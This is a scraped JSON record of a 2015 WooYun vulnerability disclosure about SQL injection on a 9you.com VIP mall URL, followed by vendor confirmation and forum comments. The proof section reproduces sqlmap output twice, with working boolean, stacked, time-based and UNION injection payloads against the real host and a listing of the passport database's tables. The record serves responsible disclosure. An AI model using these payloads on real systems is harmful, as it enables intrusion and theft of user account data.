{"id": 73703, "wybug_id": "wooyun-2015-0162489", "wybug_title": "久游网伪静态SQL注入涉及643万用户账户密码信息", "wybug_corp": "久游网", "wybug_author": "小川", "wybug_date": "2015-12-18 17:32", "wybug_open_date": "2016-02-01 19:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-01：\t细节向公众公开  简要描述： 一提到九游，我的心里就哼着：苍茫的天涯是我的爱...... 详细说明：  \n\n   漏洞证明：  web application technology: Nginxback-end DBMS: MySQL >= 5.0.0available databases [5]:[*] information_schema[*] passport[*] test[*] vip[*] vip_newsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: #1* (URI)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://uhg.9you.com:80/vip/mall/index/game_id/76) AND 7940=7940 AND (6013=6013.html    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries (SELECT - comment)    Payload: http://uhg.9you.com:80/vip/mall/index/game_id/76);(SELECT * FROM (SELECT(SLEEP(5)))WpLQ)#.html    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: http://uhg.9you.com:80/vip/mall/index/game_id/76) AND (SELECT * FROM (SELECT(SLEEP(5)))Lgns) AND (2756=2756.html    Type: UNION query    Title: Generic UNION query (NULL) - 29 columns    Payload: http://uhg.9you.com:80/vip/mall/index/game_id/76) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a786a71,0x506b5059486c4e537979,0x7176627171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- .html---web application technology: Nginxback-end DBMS: MySQL >= 5.0.0available databases [5]:[*] information_schema[*] passport[*] test[*] vip[*] vip_newDatabase: passport[68 tables]+-------------------------+| au_cdk                  || au_cdk_type             || au_itemsend             || disk_usage_master       || disk_usage_slave        || email_sign              || fast_reglog             || get_username_paycard    || get_username_registinfo || gmtools_account_sign    || log_adult               || log_appeal              || log_appeal_rest         || log_aupwd               || log_aupwd_rest          || log_email               || log_email_yahoo         || log_getpasswd           || log_idcard              || log_idcard_email        || log_info_speed          || log_login               || log_matrixcard_lost     || log_matrixcard_replace  || log_matrixcard_set      || log_matrixcard_unbind   || log_nickname_speed      || log_password_email      || log_password_modify     || log_password_vipcode    || log_profile             || log_propertylockreset   || log_provip              || log_provip_rest         || log_qa                  || log_regist_reset        || log_securecode          || log_sim                 || log_token               || log_username_mobile     || lx_code_resend_log      || lx_code_send_cpl        || lx_code_send_log        || lx_fullcode_limit       || lx_ticket               || m818_user_bind          || m818_user_bind_log      || matrixcard_info         || mobile_checkcode        || mobile_checkcode_vip    || mobile_sendmsg          || mobile_user_bind        || mobile_user_bind_email  || mobile_user_bind_log    || mobile_user_bind_regist || ms_mobile_user          || sim_bind                || sim_lost                || slave_check             || sleep_user_au_log       || sleep_user_pwd          || token_info              || token_unbind            || user_bind_ydcy          || user_bind_ydcy_err      || user_login_info         || voidnickname            || ydcy_addstorage_log     |+-------------------------+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: #1* (URI)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://uhg.9you.com:80/vip/mall/index/game_id/76) AND 7940=7940 AND (6013=6013.html    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries (SELECT - comment)    Payload: http://uhg.9you.com:80/vip/mall/index/game_id/76);(SELECT * FROM (SELECT(SLEEP(5)))WpLQ)#.html    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: http://uhg.9you.com:80/vip/mall/index/game_id/76) AND (SELECT * FROM (SELECT(SLEEP(5)))Lgns) AND (2756=2756.html    Type: UNION query    Title: Generic UNION query (NULL) - 29 columns    Payload: http://uhg.9you.com:80/vip/mall/index/game_id/76) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a786a71,0x506b5059486c4e537979,0x7176627171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- .html---web application technology: Nginxback-end DBMS: MySQL >= 5.0.0available databases [5]:[*] information_schema[*] passport[*] test[*] vip[*] vip_newDatabase: passport[68 tables]+-------------------------+| au_cdk                  || au_cdk_type             || au_itemsend             || disk_usage_master       || disk_usage_slave        || email_sign              || fast_reglog             || get_username_paycard    || get_username_registinfo || gmtools_account_sign    || log_adult               || log_appeal              || log_appeal_rest         || log_aupwd               || log_aupwd_rest          || log_email               || log_email_yahoo         || log_getpasswd           || log_idcard              || log_idcard_email        || log_info_speed          || log_login               || log_matrixcard_lost     || log_matrixcard_replace  || log_matrixcard_set      || log_matrixcard_unbind   || log_nickname_speed      || log_password_email      || log_password_modify     || log_password_vipcode    || log_profile             || log_propertylockreset   || log_provip              || log_provip_rest         || log_qa                  || log_regist_reset        || log_securecode          || log_sim                 || log_token               || log_username_mobile     || lx_code_resend_log      || lx_code_send_cpl        || lx_code_send_log        || lx_fullcode_limit       || lx_ticket               || m818_user_bind          || m818_user_bind_log      || matrixcard_info         || mobile_checkcode        || mobile_checkcode_vip    || mobile_sendmsg          || mobile_user_bind        || mobile_user_bind_email  || mobile_user_bind_log    || mobile_user_bind_regist || ms_mobile_user          || sim_bind                || sim_lost                || slave_check             || sleep_user_au_log       || sleep_user_pwd          || token_info              || token_unbind            || user_bind_ydcy          || user_bind_ydcy_err      || user_login_info         || voidnickname            || ydcy_addstorage_log     |+-------------------------+   修复方案：  天地良心，绝未脱裤,至于vip库里的信息，我都没看，intval处理下吧   版权声明：转载请注明来源 小川@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-12-18 22:53 厂商回复： 扫描器还是手工啊？感觉屌屌的，这都被你找到了，必须20分啊 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-12-18 17:40 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:1015 漏洞数:233        | 1.乌云最帅的男人                        ...)\t\t \n  低调站1楼    \n     2015-12-18 17:53 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1072 漏洞数:181        | px1624)\t\t \n  有神器就是叼！    \n     2015-12-18 19:14 |    \t\tk0_pwn \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:12        | 专注且自由)\t\t \n  年底了，川神的暴漫又要更新了    \n     2015-12-18 22:22 |    \t\t菜菜 \t\t\t( 实习白帽子  |\t\t\t        Rank:83 漏洞数:7        | cnidc.hk:500:D5B9985DFBA5FE8A050A39C249C...)\t\t \n  川神    \n     2015-12-19 09:26 |    \t\t命运 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        | 我是来乌云秀智商下限的~~)\t\t \n  求早日公开看暴漫    \n     2015-12-19 10:27 |    \t\thecate \t\t\t( 普通白帽子  |\t\t\t        Rank:722 漏洞数:109        | ®高级安全工程师 | WooYun认证√)\t\t \n  x站x多了，你自然就能感觉到哪里有注入    \n     2015-12-19 14:21 |    \t\tkevinchowsec \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:16        | 周凯文，信息安全爱好者。)\t\t \n  厂商无限惆怅，对唱：绵绵的青山脚下花正开...    \n     2015-12-19 14:59 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1451 漏洞数:223        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  @kevinchowsec 什么样的歌谣是最呀最摇摆？    \n     2015-12-19 15:24 |    \t\tMr.Wang \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 黑与白的对立中，寻求突破。)\t\t \n  哥们，加我q一下，2573465610，有事情要洽谈。    \n     2015-12-19 17:35 |    \t\twhynot \t\t\t( 普通白帽子  |\t\t\t        Rank:553 漏洞数:100        | 为你解冻冰河 为你放弃世界有何不可)\t\t \n  @小川 又一期王尼玛又开始了 so diao    \n     2015-12-19 22:55 |    \t\tTioyer \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:10        | 初来乍到，请各位大牛多多指教！)\t\t \n  川神求qq联系方式    \n     2015-12-20 19:05 |    \t\tsauren \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:27        | 天天打DOTA，快乐你我他~)\t\t \n  我是来看川神暴漫的    \n     2015-12-25 14:41 |    \t\t衣其 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 菜鸟一枚)\t\t \n  关注一下看更新    \n     2016-01-07 23:01 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1072 漏洞数:181        | px1624)\t\t \n  新浪的扫描器叼爆了    \n     2016-01-08 14:27 |    \t\t路人毛 \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:25        | ../)\t\t \n  @Mr.Wang 洽谈你麻痹~黑产商人    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}